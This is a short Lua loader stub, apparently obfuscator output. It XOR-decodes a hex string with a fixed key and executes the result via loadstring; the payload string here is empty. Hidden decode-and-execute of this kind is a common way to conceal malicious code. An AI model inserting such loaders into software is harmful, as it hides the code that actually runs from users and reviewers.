local k={64,55,143,214,120,127,113,68,53,180,184,112,50,198,10,29,207,146,20,21,163,50,185,55,25,75,111,53,114,139,145,247}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
c(table.concat(t))()
